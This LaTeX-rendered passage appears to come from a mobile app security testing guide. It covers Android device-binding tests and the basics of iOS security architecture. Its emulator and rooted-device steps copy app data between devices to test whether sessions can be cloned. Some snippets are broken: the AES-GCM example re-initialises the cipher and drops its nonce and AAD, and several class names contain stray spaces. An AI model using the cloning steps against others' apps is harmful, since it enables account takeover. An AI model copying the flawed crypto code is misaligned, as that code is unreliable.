\NormalTok{        KeyProperties.}\FunctionTok{KEY\_ALGORITHM\_AES}\NormalTok{, }\StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{keyGenerator.}\FunctionTok{init}\NormalTok{(}
        \KeywordTok{new}\NormalTok{ KeyGenParameterSpec.}\FunctionTok{Builder}\NormalTok{(}\StringTok{"key2"}\NormalTok{,}
\NormalTok{                KeyProperties.}\FunctionTok{PURPOSE\_ENCRYPT}\NormalTok{ | KeyProperties.}\FunctionTok{PURPOSE\_DECRYPT}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setBlockModes}\NormalTok{(KeyProperties.}\FunctionTok{BLOCK\_MODE\_GCM}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setEncryptionPaddings}\NormalTok{(KeyProperties.}\FunctionTok{ENCRYPTION\_PADDING\_NONE}\NormalTok{)}
\NormalTok{                .}\FunctionTok{build}\NormalTok{());}
\BuiltInTok{SecretKey}\NormalTok{ key = keyGenerator.}\FunctionTok{generateKey}\NormalTok{();}

\CommentTok{// The key can also be obtained from the Android Keystore any time as follows:}
\BuiltInTok{KeyStore}\NormalTok{ keyStore = }\BuiltInTok{KeyStore}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{keyStore.}\FunctionTok{load}\NormalTok{(}\KeywordTok{null}\NormalTok{);}
\NormalTok{key = (}\BuiltInTok{SecretKey}\NormalTok{) keyStore.}\FunctionTok{getKey}\NormalTok{(}\StringTok{"key2"}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
\end{Highlighting}
\end{Shaded}
  \item
    Encrypt the authentication data and other sensitive data stored by
    the application using a secret key through AES-GCM cipher and use
    device specific parameters such as Instance ID, etc. as associated
    data:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{Cipher}\NormalTok{ cipher = }\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"AES/GCM/NoPadding"}\NormalTok{);}
\DataTypeTok{final} \DataTypeTok{byte}\NormalTok{[] nonce = }\KeywordTok{new} \DataTypeTok{byte}\NormalTok{[GCM\_NONCE\_LENGTH];}
\NormalTok{random.}\FunctionTok{nextBytes}\NormalTok{(nonce);}
\NormalTok{GCMParameterSpec spec = }\KeywordTok{new} \FunctionTok{GCMParameterSpec}\NormalTok{(GCM\_TAG\_LENGTH * }\DecValTok{8}\NormalTok{, nonce);}
\NormalTok{cipher.}\FunctionTok{init}\NormalTok{(}\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{ENCRYPT\_MODE}\NormalTok{, key, spec);}
\DataTypeTok{byte}\NormalTok{[] aad = }\StringTok{"<deviceidentifierhere>"}\NormalTok{.}\FunctionTok{getBytes}\NormalTok{();;}
\NormalTok{cipher.}\FunctionTok{updateAAD}\NormalTok{(aad);}
\NormalTok{cipher.}\FunctionTok{init}\NormalTok{(}\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{ENCRYPT\_MODE}\NormalTok{, key);}

\CommentTok{//use the cipher to encrypt the authentication data see 0x50e for more details.}
\end{Highlighting}
\end{Shaded}
  \item
    Encrypt the secret key using the public key stored in Android
    Keystore and store the encrypted secret key in the private storage
    of the application.
  \item
    Whenever authentication data such as access tokens or other
    sensitive data is required, decrypt the secret key using private key
    stored in Android Keystore and then use the decrypted secret key to
    decrypt the ciphertext.
  \end{itemize}
\item
  Use token-based device authentication (Instance ID) to make sure that
  the same instance of the app is used.
\end{itemize}

\hypertarget{static-analysis-50}{%
\paragraph{Static Analysis}\label{static-analysis-50}}

In the past, Android developers often relied on the
\texttt{Settings.Secure.ANDROID\_ID} (SSAID) and MAC addresses. This
\href{https://android-developers.googleblog.com/2017/04/changes-to-device-identifiers-in.html}{changed
with the release of Android 8.0 (API level 26)}. As the MAC address is
now often randomized when not connected to an access point and the SSAID
is no longer a device bound ID. Instead, it became a value bound to the
user, the device and the app signing key of the application which
requests the SSAID. In addition, there are new
\href{https://developer.android.com/training/articles/user-data-ids.html}{recommendations
for identifiers} in Google's SDK documentation. Basically, Google
recommends to:

\begin{itemize}
\tightlist
\item
  use the Advertising ID (\texttt{AdvertisingIdClient.Info}) when it
  comes to advertising -so that the user has the option to decline.
\item
  use the Instance ID (\texttt{FirebaseInstanceId}) for device
  identification.
\item
  use the SSAID only for fraud detection and for sharing state between
  apps signed by the same developer.
\end{itemize}

Note that the Instance ID and the Advertising ID are not stable across
device upgrades and device-resets. However, the Instance ID will at
least allow to identify the current software installation on a device.

There are a few key terms you can look for when the source code is
available:

\begin{itemize}
\tightlist
\item
  Unique identifiers that will no longer work:

  \begin{itemize}
  \tightlist
  \item
    \texttt{Build.SERIAL} without \texttt{Build.getSerial}
  \item
    \texttt{htc.camera.sensor.front\_SN} for HTC devices
  \item
    \texttt{persist.service.bdroid.bdadd}
  \item
    \texttt{Settings.Secure.bluetooth\_address}, unless the system
    permission LOCAL\_MAC\_ADDRESS is enabled in the manifest
  \end{itemize}
\item
  \texttt{ANDROID\_ID} used only as an identifier. This will influence
  the binding quality over time for older devices.
\item
  The absence of Instance ID, \texttt{Build.SERIAL}, and the IMEI.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  TelephonyManager tm = (TelephonyManager) context.}\FunctionTok{getSystemService}\NormalTok{(}\BuiltInTok{Context}\NormalTok{.}\FunctionTok{TELEPHONY\_SERVICE}\NormalTok{);}
  \BuiltInTok{String}\NormalTok{ IMEI = tm.}\FunctionTok{getDeviceId}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  The creation of private keys in the \texttt{AndroidKeyStore} using the
  \texttt{KeyPairGeneratorSpec} or \texttt{KeyGenParameterSpec} APIs.
\end{itemize}

To be sure that the identifiers can be used, check
\texttt{AndroidManifest.xml} for usage of the IMEI and
\texttt{Build.Serial}. The file should contain the permission
\texttt{\textless{}uses-permission\ android:name="android.permission.READ\_PHONE\_STATE"\ /\textgreater{}}.

\begin{quote}
Apps for Android 8.0 (API level 26) will get the result ``UNKNOWN'' when
they request \texttt{Build.Serial}.
\end{quote}

\hypertarget{dynamic-analysis-47}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-47}}

There are several ways to test the application binding:

\hypertarget{dynamic-analysis-with-an-emulator}{%
\subparagraph{Dynamic Analysis with an
Emulator}\label{dynamic-analysis-with-an-emulator}}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Run the application on an emulator.
\item
  Make sure you can raise the trust in the application instance (e.g.,
  authenticate in the app).
\item
  Retrieve the data from the emulator according to the following steps:

  \begin{itemize}
  \tightlist
  \item
    SSH into your simulator via an ADB shell.
  \item
    Execute \texttt{run-as\ \textless{}your\ app-id\textgreater{}}. Your
    app-id is the package described in the AndroidManifest.xml.
  \item
    \texttt{chmod\ 777} the contents of cache and shared-preferences.
  \item
    Exit the current user from the the app-id.
  \item
    Copy the contents of
    \texttt{/data/data/\textless{}your\ appid\textgreater{}/cache} and
    \texttt{shared-preferences} to the SD card.
  \item
    Use ADB or the DDMS to pull the contents.
  \end{itemize}
\item
  Install the application on another emulator.
\item
  In the application's data folder, overwrite the data from step 3.

  \begin{itemize}
  \tightlist
  \item
    Copy the data from step 3 to the second emulator's SD card.
  \item
    SSH into your simulator via an ADB shell.
  \item
    Execute \texttt{run-as\ \textless{}your\ app-id\textgreater{}}. Your
    app-id is the package described in \texttt{AndroidManifest.xml}.
  \item
    \texttt{chmod\ 777} the folder's cache and shared-preferences.
  \item
    Copy the older contents of the SD card
    \texttt{to\ /data/data/\textless{}your\ appid\textgreater{}/cache}
    and \texttt{shared-preferences}.
  \end{itemize}
\item
  Can you continue in an authenticated state? If so, binding may not be
  working properly.
\end{enumerate}

\hypertarget{google-instance-id}{%
\subparagraph{Google Instance ID}\label{google-instance-id}}

\href{https://developers.google.com/instance-id/}{Google Instance ID}
uses tokens to authenticate the running application instance. The moment
the application is reset, uninstalled, etc., the Instance ID is reset,
meaning that you'll have a new ``instance'' of the app. Go through the
following steps for Instance ID:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Configure your Instance ID for the given application in your Google
  Developer Console. This includes managing the PROJECT\_ID.
\item
  Setup Google Play services. In the file \texttt{build.gradle}, add

\begin{verbatim}
apply plugin: 'com.android.application'
    ...

    dependencies {
        compile 'com.google.android.gms:play-services-gcm:10.2.4'
    }
\end{verbatim}
\item
  Get an Instance ID.

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{String}\NormalTok{ iid = Instance ID.}\FunctionTok{getInstance}\NormalTok{(context).}\FunctionTok{getId}\NormalTok{();}
\CommentTok{//now submit this iid to your server.}
\end{Highlighting}
\end{Shaded}
\item
  Generate a token.

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{String}\NormalTok{ authorizedEntity = PROJECT\_ID; }\CommentTok{// Project id from Google Developer Console}
\BuiltInTok{String}\NormalTok{ scope = }\StringTok{"GCM"}\NormalTok{; }\CommentTok{// e.g. communicating using GCM, but you can use any}
                    \CommentTok{// URL{-}safe characters up to a maximum of 1000, or}
                    \CommentTok{// you can also leave it blank.}
\BuiltInTok{String}\NormalTok{ token = Instance ID.}\FunctionTok{getInstance}\NormalTok{(context).}\FunctionTok{getToken}\NormalTok{(authorizedEntity,scope);}
\CommentTok{//now submit this token to the server.}
\end{Highlighting}
\end{Shaded}
\item
  Make sure that you can handle callbacks from Instance ID, in case of
  invalid device information, security issues, etc. This requires
  extending \texttt{Instance\ IDListenerService} and handling the
  callbacks there:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MyInstance IDService }\KeywordTok{extends}\NormalTok{ Instance IDListenerService \{}
\KeywordTok{public} \DataTypeTok{void} \FunctionTok{onTokenRefresh}\NormalTok{() \{}
    \FunctionTok{refreshAllTokens}\NormalTok{();}
\NormalTok{\}}

\KeywordTok{private} \DataTypeTok{void} \FunctionTok{refreshAllTokens}\NormalTok{() \{}
    \CommentTok{// assuming you have defined TokenList as}
    \CommentTok{// some generalized store for your tokens for the different scopes.}
    \CommentTok{// Please note that for application validation having just one token with one scopes can be enough.}
    \BuiltInTok{ArrayList}\NormalTok{<TokenList> tokenList = TokensList.}\FunctionTok{get}\NormalTok{();}
\NormalTok{    Instance ID iid = Instance ID.}\FunctionTok{getInstance}\NormalTok{(}\KeywordTok{this}\NormalTok{);}
    \KeywordTok{for}\NormalTok{(tokenItem : tokenList) \{}
\NormalTok{    tokenItem.}\FunctionTok{token}\NormalTok{ =}
\NormalTok{        iid.}\FunctionTok{getToken}\NormalTok{(tokenItem.}\FunctionTok{authorizedEntity}\NormalTok{,tokenItem.}\FunctionTok{scope}\NormalTok{,tokenItem.}\FunctionTok{options}\NormalTok{);}
    \CommentTok{// send this tokenItem.token to your server}
\NormalTok{    \}}
\NormalTok{\}}
\NormalTok{\};}
\end{Highlighting}
\end{Shaded}
\item
  Register the service in your Android manifest:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<service}\OtherTok{ android:name=}\StringTok{".MyInstance IDService"}\OtherTok{ android:exported=}\StringTok{"false"}\KeywordTok{>}
\KeywordTok{<intent{-}filter>}
        \KeywordTok{<action}\OtherTok{ android:name=}\StringTok{"com.google.android.gms.iid.Instance ID"} \KeywordTok{/>}
\KeywordTok{</intent{-}filter>}
\KeywordTok{</service>}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

When you submit the Instance ID (iid) and the tokens to your server, you
can use that server with the Instance ID Cloud Service to validate the
tokens and the iid. When the iid or token seems invalid, you can trigger
a safeguard procedure (e.g., informing the server of possible copying or
security issues or removing the data from the app and asking for a
re-registration).

Please note that
\href{https://firebase.google.com/docs/reference/android/com/google/firebase/iid/FirebaseInstanceId}{Firebase
also supports Instance ID}.

\hypertarget{imei-serial}{%
\subparagraph{IMEI \& Serial}\label{imei-serial}}

Google recommends not using these identifiers unless the application is
at a high risk.

For Android devices before Android 8.0 (API level 26), you can request
the serial as follows:

\begin{Shaded}
\begin{Highlighting}[]
   \BuiltInTok{String}\NormalTok{ serial = android.}\FunctionTok{os}\NormalTok{.}\FunctionTok{Build}\NormalTok{.}\FunctionTok{SERIAL}\NormalTok{;}
\end{Highlighting}
\end{Shaded}

For devices running Android version O and later, you can request the
device's serial as follows:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Set the permission in your Android manifest:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<uses{-}permission}\OtherTok{ android:name=}\StringTok{"android.permission.READ\_PHONE\_STATE"} \KeywordTok{/>}
\KeywordTok{<uses{-}permission}\OtherTok{ android:name=}\StringTok{"android.permission.ACCESS\_NETWORK\_STATE"} \KeywordTok{/>}
\end{Highlighting}
\end{Shaded}
\item
  Request the permission at runtime from the user: See
  \url{https://developer.android.com/training/permissions/requesting.html}
  for more details.
\item
  Get the serial:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{String}\NormalTok{ serial = android.}\FunctionTok{os}\NormalTok{.}\FunctionTok{Build}\NormalTok{.}\FunctionTok{getSerial}\NormalTok{();}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

Retrieve the IMEI:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Set the required permission in your Android manifest:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<uses{-}permission}\OtherTok{ android:name=}\StringTok{"android.permission.READ\_PHONE\_STATE"} \KeywordTok{/>}
\end{Highlighting}
\end{Shaded}
\item
  If you're using Android version Android 6 (API level 23) or later,
  request the permission at runtime from the user: See
  \url{https://developer.android.com/training/permissions/requesting.html}
  for more details.
\item
  Get the IMEI:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{TelephonyManager tm = (TelephonyManager) context.}\FunctionTok{getSystemService}\NormalTok{(}\BuiltInTok{Context}\NormalTok{.}\FunctionTok{TELEPHONY\_SERVICE}\NormalTok{);}
\BuiltInTok{String}\NormalTok{ IMEI = tm.}\FunctionTok{getDeviceId}\NormalTok{();}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\hypertarget{ssaid}{%
\subparagraph{SSAID}\label{ssaid}}

Google recommends not using these identifiers unless the application is
at a high risk. You can retrieve the SSAID as follows:

\begin{Shaded}
\begin{Highlighting}[]
  \BuiltInTok{String}\NormalTok{ SSAID = Settings.}\FunctionTok{Secure}\NormalTok{.}\FunctionTok{ANDROID\_ID}\NormalTok{;}
\end{Highlighting}
\end{Shaded}

The behavior of the SSAID and MAC addresses have
\href{https://android-developers.googleblog.com/2017/04/changes-to-device-identifiers-in.html}{changed
since Android 8.0 (API level 26)}. In addition, there are
\href{https://developer.android.com/training/articles/user-data-ids.html}{new
recommendations} for identifiers in Google's SDK documentation. Because
of this new behavior, we recommend that developers not rely on the SSAID
alone. The identifier has become less stable. For example, the SSAID may
change after a factory reset or when the app is reinstalled after the
upgrade to Android 8.0 (API level 26). There are devices that have the
same \texttt{ANDROID\_ID} and/or have an \texttt{ANDROID\_ID} that can
be overridden. Therefore it is better to encrypt the
\texttt{ANDROID\_ID} with a randomly generated key from the
\texttt{AndroidKeyStore} using \texttt{AES\_GCM} encryption. The
encrypted \texttt{ANDROID\_ID} should then be stored in the
\texttt{SharedPreferences} (privately). The moment the app-signature
changes, the application can check for a delta and register the new
\texttt{ANDROID\_ID}. The moment this changes without a new application
signing key, it should indicate that something else is wrong.

\hypertarget{effectiveness-assessment-6}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-6}}

There are a few key terms you can look for when the source code is
available:

\begin{itemize}
\tightlist
\item
  Unique identifiers that will no longer work:

  \begin{itemize}
  \tightlist
  \item
    \texttt{Build.SERIAL} without \texttt{Build.getSerial}
  \item
    \texttt{htc.camera.sensor.front\_SN} for HTC devices
  \item
    \texttt{persist.service.bdroid.bdadd}
  \item
    \texttt{Settings.Secure.bluetooth\_address} or
    \texttt{WifiInfo.getMacAddress} from \texttt{WifiManager}, unless
    the system permission \texttt{LOCAL\_MAC\_ADDRESS} is enabled in the
    manifest.
  \end{itemize}
\item
  Usage of ANDROID\_ID as an identifier only. Over time, this will
  influence the binding quality on older devices.
\item
  The absence of Instance ID, \texttt{Build.SERIAL}, and the IMEI.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  TelephonyManager tm = (TelephonyManager) context.}\FunctionTok{getSystemService}\NormalTok{(}\BuiltInTok{Context}\NormalTok{.}\FunctionTok{TELEPHONY\_SERVICE}\NormalTok{);}
  \BuiltInTok{String}\NormalTok{ IMEI = tm.}\FunctionTok{getDeviceId}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

To make sure that the identifiers can be used, check
\texttt{AndroidManifest.xml} for usage of the IMEI and
\texttt{Build.Serial}. The manifest should contain the permission
\texttt{\textless{}uses-permission\ android:name="android.permission.READ\_PHONE\_STATE"\ /\textgreater{}}.

There are a few ways to test device binding dynamically:

\hypertarget{using-an-emulator}{%
\subparagraph{Using an Emulator}\label{using-an-emulator}}

See section
``\protect\hyperlink{dynamic-analysis-with-an-emulator}{Dynamic Analysis
with an Emulator}'' above.

\hypertarget{using-two-different-rooted-devices}{%
\subparagraph{Using two different rooted
devices}\label{using-two-different-rooted-devices}}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Run the application on your rooted device.
\item
  Make sure you can raise the trust (e.g., authenticate in the app) in
  the application instance.
\item
  Retrieve the data from the first rooted device.
\item
  Install the application on the second rooted device.
\item
  In the application's data folder, overwrite the data from step 3.
\item
  Can you continue in an authenticated state? If so, binding may not be
  working properly.
\end{enumerate}

\hypertarget{references-15}{%
\subsubsection{References}\label{references-15}}

\hypertarget{owasp-masvs-12}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-12}}

\begin{itemize}
\tightlist
\item
  MSTG-RESILIENCE-1: ``The app detects, and responds to, the presence of
  a rooted or jailbroken device either by alerting the user or
  terminating the app.''
\item
  MSTG-RESILIENCE-2: ``The app prevents debugging and/or detects, and
  responds to, a debugger being attached. All available debugging
  protocols must be covered.''
\item
  MSTG-RESILIENCE-3: ``The app detects, and responds to, tampering with
  executable files and critical data within its own sandbox.''
\item
  MSTG-RESILIENCE-4: ``The app detects, and responds to, the presence of
  widely used reverse engineering tools and frameworks on the device.''
\item
  MSTG-RESILIENCE-5: ``The app detects, and responds to, being run in an
  emulator.''
\item
  MSTG-RESILIENCE-6: ``The app detects, and responds to, tampering the
  code and data in its own memory space.''
\item
  MSTG-RESILIENCE-9: ``Obfuscation is applied to programmatic defenses,
  which in turn impede de-obfuscation via dynamic analysis.''
\item
  MSTG-RESILIENCE-10: ``The app implements a `device binding'
  functionality using a device fingerprint derived from multiple
  properties unique to the device.''
\end{itemize}

\hypertarget{safetynet-attestation}{%
\paragraph{SafetyNet Attestation}\label{safetynet-attestation}}

\begin{itemize}
\tightlist
\item
  Developer Guideline -
  \url{https://developer.android.com/training/safetynet/attestation.html}
\item
  SafetyNet Attestation Checklist -
  \url{https://developer.android.com/training/safetynet/attestation-checklist}
\item
  Do's \& Don'ts of SafetyNet Attestation -
  \url{https://android-developers.googleblog.com/2017/11/10-things-you-might-be-doing-wrong-when.html}
\item
  SafetyNet Verification Samples -
  \url{https://github.com/googlesamples/android-play-safetynet/}
\item
  SafetyNet Attestation API - Quota Request -
  \url{https://support.google.com/googleplay/android-developer/contact/safetynetqr}
\end{itemize}

\hypertarget{tools-8}{%
\paragraph{Tools}\label{tools-8}}

\begin{itemize}
\tightlist
\item
  adb - \url{https://developer.android.com/studio/command-line/adb}
\item
  Frida - \url{https://www.frida.re}
\item
  DDMS - \url{https://developer.android.com/studio/profile/monitor}
\end{itemize}

\hypertarget{testing-application-security-on-ios}{%
\section{Testing Application Security on
iOS}\label{testing-application-security-on-ios}}

\hypertarget{ios-platform-overview}{%
\subsection{iOS Platform Overview}\label{ios-platform-overview}}

iOS is a mobile operating system that powers Apple mobile devices,
including the iPhone, iPad, and iPod Touch. It is also the basis for
Apple tvOS, which inherits many functionalities from iOS. This section
introduces the iOS platform from an architecture point of view. The
following five key areas are discussed:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  iOS security architecture
\item
  iOS application structure
\item
  Inter-process Communication (IPC)
\item
  iOS application publishing
\item
  iOS Application Attack Surface
\end{enumerate}

Like the Apple desktop operating system macOS (formerly OS X), iOS is
based on Darwin, an open source Unix operating system developed by
Apple. Darwin's kernel is XNU (``X is Not Unix''), a hybrid kernel that
combines components of the Mach and FreeBSD kernels.

However, iOS apps run in a more restricted environment than their
desktop counterparts do. iOS apps are isolated from each other at the
file system level and are significantly limited in terms of system API
access.

To protect users from malicious applications, Apple restricts and
controls access to the apps that are allowed to run on iOS devices.
Apple's App Store is the only official application distribution
platform. There developers can offer their apps and consumers can buy,
download, and install apps. This distribution style differs from
Android, which supports several app stores and sideloading (installing
an app on your iOS device without using the official App Store). In iOS,
sideloading typically refers to the app installation method via USB,
although there are other enterprise iOS app distribution methods that do
not use the App Store under the
\href{https://developer.apple.com/programs/enterprise/}{Apple Developer
Enterprise Program}.

In the past, sideloading was possible only with a jailbreak or
complicated workarounds. With iOS 9 or higher, it is possible to
\href{https://www.igeeksblog.com/how-to-sideload-apps-on-iphone-ipad-in-ios-10/}{sideload
via Xcode}.

iOS apps are isolated from each other via Apple's iOS sandbox
(historically called Seatbelt), a mandatory access control (MAC)
mechanism describing the resources an app can and can't access. Compared
to Android's extensive Binder IPC facilities, iOS offers very few IPC
(Inter Process Communication) options, minimizing the potential attack
surface.

Uniform hardware and tight hardware/software integration create another
security advantage. Every iOS device offers security features, such as
secure boot, hardware-backed Keychain, and file system encryption
(referred as data protection in iOS). iOS updates are usually quickly
rolled out to a large percentage of users, decreasing the need to
support older, unprotected iOS versions.

In spite of the numerous strengths of iOS, iOS app developers still need
to worry about security. Data protection, Keychain, Touch ID/Face ID
authentication, and network security still leave a large margin for
errors. In the following chapters, we describe iOS security
architecture, explain a basic security testing methodology, and provide
reverse engineering how-tos.

\hypertarget{ios-security-architecture}{%
\subsubsection{iOS Security
Architecture}\label{ios-security-architecture}}

The
\href{https://www.apple.com/business/docs/iOS_Security_Guide.pdf}{iOS
security architecture}, officially documented by Apple in the iOS
Security Guide, consists of six core features. This security guide is
updated by Apple for each major iOS version:

\begin{itemize}
\tightlist
\item
  Hardware Security
\item
  Secure Boot
\item
  Code Signing
\item
  Sandbox
\item
  Encryption and Data Protection
\item
  General Exploit Mitigations
\end{itemize}

\begin{figure}
\centering
\includegraphics[width=2.86458in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/d4e80dd1320b9b3dc91c94b0608a477026670825.png}
\caption{iOS Security Architecture}
\end{figure}

\hypertarget{hardware-security}{%
\paragraph{Hardware Security}\label{hardware-security}}

The iOS security architecture makes good use of hardware-based security
features that enhance overall performance. Each iOS device comes with
two built-in Advanced Encryption Standard (AES) 256-bit keys. The
device's unique IDs (UIDs) and a device group IDs (GIDs) are AES 256-bit
keys fused (UID) or compiled (GID) into the Application Processor (AP)
and Secure Enclave Processor (SEP) during manufacturing. There's no
direct way to read these keys with software or debugging interfaces such
as JTAG. Encryption and decryption operations are performed by hardware
AES crypto-engines that have exclusive access to these keys.

The GID is a value shared by all processors in a class of devices used
to prevent tampering with firmware files and other cryptographic tasks
not directly related to the user's private data. UIDs, which are unique
to each device, are used to protect the key hierarchy that's used for
device-level file system encryption. Because UIDs aren't recorded during
manufacturing, not even Apple can restore the file encryption keys for a
particular device.

To allow secure deletion of sensitive data on flash memory, iOS devices
include a feature called
\href{https://www.apple.com/business/docs/iOS_Security_Guide.pdf}{Effaceable
Storage}. This feature provides direct low-level access to the storage
technology, making it possible to securely erase selected blocks.

\hypertarget{secure-boot}{%
\paragraph{Secure Boot}\label{secure-boot}}

When an iOS device is powered on, it reads the initial instructions from
the read-only memory known as Boot ROM, which bootstraps the system. The
Boot ROM contains immutable code and the Apple Root CA, which is etched
into the silicon chip during the fabrication process, thereby creating
the root of trust. Next, the Boot ROM makes sure that the LLB's (Low
Level Bootloader) signature is correct, and the LLB checks that the
iBoot bootloader's signature is correct too. After the signature is
validated, the iBoot checks the signature of the next boot stage, which
is the iOS kernel. If any of these steps fail, the boot process will
terminate immediately and the device will enter recovery mode and
display the \href{https://support.apple.com/en-us/HT203122}{restore
screen}. However, if the Boot ROM fails to load, the device will enter a
special low-level recovery mode called Device Firmware Upgrade (DFU).
This is the last resort for restoring the device to its original state.
In this mode, the device will show no sign of activity; i.e., its screen
won't display anything.

This entire process is called the ``Secure Boot Chain''. Its purpose is
focused on verifying the boot process integrity, ensuring that the
system and its components are written and distributed by Apple. The
Secure Boot chain consists of the kernel, the bootloader, the kernel
extension, and the baseband firmware.

\hypertarget{code-signing}{%
\paragraph{Code Signing}\label{code-signing}}

Apple has implemented an elaborate DRM system to make sure that only
Apple-approved code runs on their devices, that is, code signed by
Apple. In other words, you won't be able to run any code on an iOS
device that hasn't been jailbroken unless Apple explicitly allows it.
End users are supposed to install apps through the official Apple's App
Store only. For this reason (and others), iOS has been
\href{https://www.eff.org/deeplinks/2012/05/apples-crystal-prison-and-future-open-platforms}{compared
to a crystal prison}.

A developer profile and an Apple-signed certificate are required to
deploy and run an application. Developers need to register with Apple,
join the
\href{https://developer.apple.com/support/compare-memberships/}{Apple
Developer Program} and pay a yearly subscription to get the full range
of development and deployment possibilities. There's also a free
developer account that allows you to compile and deploy apps (but not
distribute them in the App Store) via sideloading.

\hypertarget{encryption-and-data-protection}{%
\paragraph{Encryption and Data
Protection}\label{encryption-and-data-protection}}

\emph{FairPlay Code Encryption} is applied to apps downloaded from the
App Store. FairPlay was developed as a DRM when purchasing multimedia
content. Originally, FairPlay encryption was applied to MPEG and
QuickTime streams, but the same basic concepts can also be applied to
executable files. The basic idea is as follows: Once you register a new
Apple user account, or Apple ID, a public/private key pair will be
created and assigned to your account. The private key is securely stored
on your device. This means that FairPlay-encrypted code can be decrypted
only on devices associated with your account. Reverse FairPlay
encryption is usually obtained by running the app on the device, then
dumping the decrypted code from memory (see also ``Basic Security
Testing on iOS'').

Apple has built encryption into the hardware and firmware of its iOS
devices since the release of the iPhone 3GS. Every device has a
dedicated hardware-based cryptographic engine that provides an
implementation of the AES 256-bit encryption and the SHA-1 hashing
algorithms. In addition, there's a unique identifier (UID) built into
each device's hardware with an AES 256-bit key fused into the
Application Processor. This UID is unique and not recorded elsewhere. At
the time of writing, neither software nor firmware can directly read the
UID. Because the key is burned into the silicon chip, it can't be
tampered with or bypassed. Only the crypto engine can access it.

Building encryption into the physical architecture makes it a default
security feature that can encrypt all data stored on an iOS device. As a
result, data protection is implemented at the software level and works
with the hardware and firmware encryption to provide more security.

When data protection is enabled, by simply establishing a passcode in
the mobile device, each data file is associated with a specific
protection class. Each class supports a different level of accessibility
and protects data on the basis of when the data needs to be accessed.
The encryption and decryption operations associated with each class are
based on multiple key mechanisms that utilize the device's UID and
passcode, a class key, a file system key, and a per-file key. The
per-file key is used to encrypt the file's contents. The class key is
wrapped around the per-file key and stored in the file's metadata. The
file system key is used to encrypt the metadata. The UID and passcode
protect the class key. This operation is invisible to users. To enable
data protection, the passcode must be used when accessing the device.
The passcode unlocks the device. Combined with the UID, the passcode
also creates iOS encryption keys that are more resistant to hacking and
brute-force attacks. Enabling data protection is the main reason for
users to use passcodes on their devices.

\hypertarget{sandbox}{%
\paragraph{Sandbox}\label{sandbox}}

The
\href{https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html}{appsandbox}
is an iOS access control technology. It is enforced at the kernel level.
Its purpose is limiting system and user data damage that may occur when
an app is compromised.

Sandboxing has been a core security feature since the first release of
iOS. All third-party apps run under the same user (\texttt{mobile}), and
only a few system applications and services run as \texttt{root} (or
other specific system users). Regular iOS apps are confined to a
\emph{container} that restricts access to the app's own files and a very
limited number of system APIs. Access to all resources (such as files,
network sockets, IPCs, and shared memory) are controlled by the sandbox.
These restrictions work as follows {[}\#levin{]}:

\begin{itemize}
\tightlist
\item
  The app process is restricted to its own directory (under
  /var/mobile/Containers/Bundle/Application/ or
  /var/containers/Bundle/Application/, depending on the iOS version) via
  a chroot-like process.
\item
  The \texttt{mmap} and \texttt{mmprotect} system calls are modified to
  prevent apps from making writable memory pages executable and stopping
  processes from executing dynamically generated code. In combination
  with code signing and FairPlay, this strictly limits what code can run
  under specific circumstances (e.g., all code in apps distributed via
  the App Store is approved by Apple).
\item
  Processes are isolated from each other, even if they are owned by the
  same UID at the operating system level.
\item
  Hardware drivers can't be accessed directly. Instead, they must be
  accessed through Apple's public frameworks.
\end{itemize}

\hypertarget{general-exploit-mitigations}{%
\paragraph{General Exploit
Mitigations}\label{general-exploit-mitigations}}

iOS implements address space layout randomization (ASLR) and eXecute
Never (XN) bit to mitigate code execution attacks.

ASLR randomizes the memory location of the program's executable file,
data, heap, and stack every time the program is executed. Because the
shared libraries must be static to be accessed by multiple processes,
the addresses of shared libraries are randomized every time the OS boots
instead of every time the program is invoked. This makes specific
function and library memory addresses hard to predict, thereby
preventing attacks such as the return-to-libc attack, which involves the
memory addresses of basic libc functions.

The XN mechanism allows iOS to mark selected memory segments of a
process as non-executable. On iOS, the process stack and heap of
user-mode processes is marked non-executable. Pages that are writable
cannot be marked executable at the same time. This prevents attackers to
execute machine code injected into the stack or heap.

\hypertarget{software-development-on-ios}{%
\subsubsection{Software Development on
iOS}\label{software-development-on-ios}}

Like other platforms, Apple provides a Software Development Kit (SDK)
that helps developers to develop, install, run, and test native iOS
Apps. Xcode is an Integrated Development Environment (IDE) for Apple
